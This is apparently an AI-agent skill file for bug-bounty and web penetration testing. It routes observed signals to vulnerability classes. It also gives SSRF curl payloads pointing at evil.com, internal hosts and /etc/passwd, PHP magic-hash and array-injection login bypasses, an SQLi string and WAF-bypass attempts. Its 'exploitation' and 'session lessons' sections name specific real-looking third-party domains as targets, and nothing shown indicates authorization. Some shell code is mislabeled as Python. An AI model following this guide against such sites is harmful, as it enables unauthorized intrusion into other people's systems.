# HACKING SKILLS / HackSkills

## Overview

This is a top-level routing skill for **bug bounty, web security, API security, and authorized penetration testing**.

Its core role is not to replace all specialized techniques, but to help the agent:

1. First determine the testing phase (Recon / Validation / Privilege Escalation / Chain building)
2. Then select the correct vulnerability category
3. Avoid relying only on baseline model memory; prefer structured methodology
4. Prioritize boundary conditions AI often misses but that matter in real engagements

## Trust Model

- This knowledge base emphasizes content safety and auditability.
- Use this only within **authorized targets**, **legitimate research**, **defensive validation**, and **bug-bounty-approved rules**.
- Do not use these techniques for unauthorized attacks.

## When to Use This Skill

Use this skill first in the following scenarios:

- You just received a new bug bounty target and do not know where to start
- You need to decide whether to load XSS / SQLi / SSRF / IDOR / JWT / API tracks first
- You want the agent to perform Web/API security testing with a more stable methodology
- You need to route scattered findings to the right attack surface
- You want AI to miss fewer critical test points in security work

## Operating Model

### Step 1: Start with Recon and context validation

Collect first:

- Target type: classic web, REST API, mobile backend, admin panel, payment flow, file upload, GraphQL
- Identity and permission model: anonymous, regular user, admin, multi-tenant
- Input locations: URL, query parameters, JSON, headers, cookies, filenames, imported files, templates, reflection points
- Output locations: HTML, attributes, JS, PDF, email, logs, background tasks, mobile endpoints

### Step 2: Route by observed behavior

| Signal | Priority direction |
|---|---|
| Input reflects into HTML / JS | XSS / SSTI |
| Server actively fetches URL / hostname | SSRF |
| Accepts XML / Office / SVG | XXE |
| Path, filename, or download endpoint is controllable | Path Traversal / LFI |
| Many object IDs appear in APIs | IDOR / BOLA / BFLA |
| Login, reset password, 2FA, sessions | Auth Bypass / JWT / OAuth |
| Multi-step transactions, coupons, pricing, inventory | Business Logic |
| MongoDB / JSON query syntax exposure | NoSQL Injection |
| CLI tools, image processing, importers | Command Injection |
| HTTP parsing anomalies / front-back framing mismatch | Request Smuggling |
| Node.js JSON handling / controllable `__proto__` | Prototype Pollution |
| PHP weak comparison / 0e hash / loose conditions | Type Juggling |
| Repeated parameter names / WAF-app parsing mismatch | HTTP Parameter Pollution |
| One-time operations (coupon/inventory/reset) | Race Condition |
| XML/XSLT template processing | XSLT Injection |
| Accessible .git/.svn/.env paths | Insecure SCM |
| CSV/Excel export features | CSV Formula Injection |
| WebSocket protocol upgrades | WebSocket Security |
| Internal package names / supply-chain inventory | Dependency Confusion |

### Step 3: Use the most likely-hit testing order

1. Recon / Methodology
2. API Security / Auth / IDOR
3. XSS / SQLi / SSRF / SSTI / XXE
4. Business Logic / Race Condition
5. Chained exploits and privilege-escalation paths

### Anti-Hang Gia / Upstream Proxy Pattern

Common target pattern for Vietnamese anti-counterfeit systems:
```
Frontend: nghimmo.com (PHP form-based verify)
Backend API: /api/index.php?action=verify (POST JSON)
Upstream: fw.bestten.cn (IIS 8.5, Chinese interface)
```

**Exploitation pattern:**
1. Frontend API (`nghimmo.com/api/`) typically wraps remote services
2. Test if API proxies to upstream before validating input
3. SSRF via code parameter → inject `evil.com` as "code" triggers external request
4. WAF blocks direct `/etc/passwd` attempts → path traversal blocked by one-shot protection

**Auth bypass via admin panel:**
- Form: `admin.php` with `mat_khau` POST field
- GET method bypass works initially but form still renders (false positive)
- **Real bypass**: Use array injection `mat_khau[]=val1&mat_khau[]=val2` — may trigger multi-value validation bugs in poorly implemented auth
- **Magic hash payloads** (PHP type juggling): Try QNKCDZO, 240610708, s878926199a, etc.
- **Never use**: `--data-urlencode` — always use raw POST for special characters like `' OR 1=1`

**WAF Behavior Detection:**
- 403 = blocked (Cloudflare/WAF)
- 404 = resource not found
- 200 + "không tồn tại" = normal response (NOT a vulnerability)
- Look for error message differences: "Mật khẩu không đúng" vs "Dữ liệu mã số" vs "API không tồn tại"

### SSRF via Code Field Testing

When API takes "code"/"id"/"reference" params:
```python
# Direct proxy test
curl -X POST 'https://target.com/api' \
     -H 'Content-Type: application/json' \
     -d '{"code":"http://evil.com"}'

# Internal network access  
curl -X POST 'https://target.com/api' \
     -H 'Content-Type: application/json' \
     -d '{"code":"http://192.168.1.1/admin.php"}'

# Filter bypass (strip non-digits)
curl -X POST 'https://target.com/api' \
     -H 'Content-Type: application/json' \
     -d '{"code":"../etc/passwd"}'  # Will return filter error, confirming sanitization
```

**Key insight**: If filter strips non-digits, SQLi via that field is impossible unless there's an oracle (timing/error-based).

- [Next.js SPA + AMP Dual Landing Recon](./references/nextjs-spa-amp-recon.md) — Modern web app architecture discovery and assessment

## Session-Specific Lessons (2026-08-31)

### Kubernetes Internal Endpoint Leakage via Client-Side Beacons

When analyzing JavaScript bundles, look for **network telemetry beacons** that POST to internal services:

```javascript
navigator.sendBeacon("http://unleash.unleash.svc.cluster.local:4242/api",
  JSON.stringify({type:"html_render",page:page,hostname:location.hostname,...}))
```

**What this reveals:**
- Target runs on Kubernetes infrastructure
- Internal service endpoints are embedded in public JS
- Client-side code may attempt to reach cluster-internal addresses

**Exploitation angle:**
- Can beacon URL be spoofed/redirected to other internal services?
- Does the client send credentials/tokens with beacon requests?
- Can `trace_id` or session data in beacon be manipulated?

**Recon command pattern:**
```python
# Extract ALL URLs from JS bundles including internal IPs/domains
for f in *.js; do grep -oE '(https?://[^"'"'"' >)]+|"[^"]*api[^"]*")' "$f" | sort -u; done
```

### SPA + AMP Dual Landing Pattern

Modern applications often use:
1. **Main landing**: Next.js SPA with dynamic routing (`/register` → 404, not real page)
2. **AMP redirect**: Static AMP page at different subdomain (`masuk.festivalsuperjp.com`)
3. **Backend API**: Fully protected behind WAF/API gateway (`api.vsuperadmin.com` → all 403)

**Testing approach:**
- Don't assume `/register` endpoint exists — check if it's SPA-only routing
- Find the "real" registration flow via social media channels (Telegram/Facebook groups)
- Backend APIs are often fully blocked to unauthenticated access — requires valid JWT
- Look for third-party script integration points (PushAlert, Google Tag Manager, etc.)

### Cloudflare WAF + nginx 403 Defense Chain

Common defense stack:
```
Cloudflare WAF → Next.js SPA → nginx 403 (backend API)
```

**Bypass attempts that typically fail:**
- Path normalization tricks (`/auth/login/..;/auth/login`)
- Header manipulation (`X-Original-URL`, `X-Rewrite-URL`)
- Method tampering (`POST /auth/login` when only GET allowed)

**Key insight:** The backend is properly segmented — no direct public access without valid session token. Requires authentication bypass or account creation before authenticated testing.

**Pitfall:** Scanner finds 403 status ≠ vulnerable. Modern apps return 403 for all protected routes. Body content tells the story ("nginx" vs app-specific error message).

## High-Value Expert Intuitions

These are points many baseline models miss, but they are frequently effective in real bug bounty work:

1. **The same filtering logic is often reused across multiple pages**: if one point is bypassable, similar pages usually are too.
2. **Parameter names are an attack surface too**: WAFs often inspect values but not names.
3. **Second-order vulnerabilities are common**: safe at storage time does not mean safe when later read into a dangerous context.
4. **BOLA is fundamentally 'authenticated but unauthorized'**: replaying with account A/B switching is critical.
5. **Older API versions are most likely to miss patches**: fixing v2 does not mean v1 was retired.
6. **Business-logic vulnerabilities often bring highest impact**: scanners miss them and they persist longer.
7. **Race conditions should prioritize one-time actions**: coupon redemption, claims, resets, invites, trials, inventory deduction.
8. **For JWT attacks, check key and algorithm context first**: do not blindly spray payloads; verify `alg`, `kid`, JWKS, and key source first.

## Suggested Prompts

Use this skill as a router to make the agent clarify phase and goal first:

- "First, plan the testing route for this target using bug bounty methodology.
- "This is a REST API; prioritize BOLA, BFLA, Mass Assignment, and JWT angles.
- "This parameter triggers server-side requests; list key validation points from an SSRF perspective.
- "This feature is a payment/coupon/inventory flow; prioritize business logic and race-condition analysis.
- "I only see login and password-reset flows; analyze via Auth Bypass + OAuth/JWT + CSRF.

## Installation Notes

Recommended skill name:

- `hack`

Recommended search keywords:

- `HackSkills`
- `HACKING SKILLS`
- `bug bounty`
- `bug bounty hunter`

## Guidelines

- Prioritize routing by target type and observed behavior, not random payload enumeration.
- When payloads are needed, prefer quick-start / first-pass samples in the corresponding main skill instead of adding another intermediate router.
- Prioritize reusable filters, shared components, and cross-page reproduction paths.
- Confirm authentication, authorization, and version boundaries before deeper exploitation.
- Preserve explainable, auditable, reproducible testing processes.
- When full repository context is available, return to topic documents for finer exploitation details.
